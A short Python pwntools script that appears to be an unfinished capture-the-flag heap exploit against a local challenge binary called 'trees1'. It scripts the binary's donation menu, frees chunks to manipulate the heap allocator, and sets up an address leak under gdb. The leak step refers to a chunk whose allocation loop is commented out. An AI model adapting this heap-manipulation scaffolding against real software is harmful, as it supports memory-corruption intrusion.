from pwn import *


def make_donation():
	p.sendline("1")
	p.recvuntil("Exit\n> ")


def revoke_donation(id):
	p.sendline("2")
	p.recvuntil("> ")
	p.sendline(str(id))
	p.recvuntil("Exit\n> ")


def edit_donation(id,name,len_desc,desc,amount):
	p.sendline("3")
	p.recvuntil("> ")
	p.sendline(str(id))
	p.recvuntil("Enter new name.\n")
	p.sendline(name)
	p.recvuntil("description.\n> ")
	p.sendline(str(len_desc))
	p.recvuntil("description.\n")
	p.sendline(desc)
	p.recvuntil("amount.\n> ")
	p.sendline(str(amount))
	p.recvuntil("Exit\n> ")

def edit_for_leak(id,name,len_desc,desc,amount):
	p.sendline("3")
	p.recvuntil("> ")
	p.sendline(str(id))
	p.recvuntil("Enter new name.\n")
	p.sendline(name)
	p.recvuntil("description.\n> ")
	p.sendline(str(len_desc))
	p.recvuntil("description.\n")
	p.send(desc)
	p.recvuntil("amount.\n> ")
	p.sendline(str(amount))
	p.recvuntil("Exit\n> ")

def print_donation(id):
	p.sendline("4")
	p.recvuntil("> ")
	p.sendline(str(id))
	data=p.recvuntil("1) ")[:-3]
	p.recvuntil("Exit\n> ")

def exit():
	p.sendline("5")


p=process("trees1",env = {'LD_PRELOAD' : './libc.so.6'})

for i in range(9):
	make_donation()

for i in range(9):
	edit_donation(i+1,str(i)*8,0x128,chr(65+i)*0x128,10)

for i in range(8):
	revoke_donation(i+1)
"""
for i in range(8):
	make_donation()
for i in range(7):
	edit_donation(i+10,str(i)*8,0x128,chr(65+i)*0x128,10)
"""

gdb.attach(p.pid)
pause()
edit_for_leak(7+10,"LEAK",1,"a",10)


p.interactive()









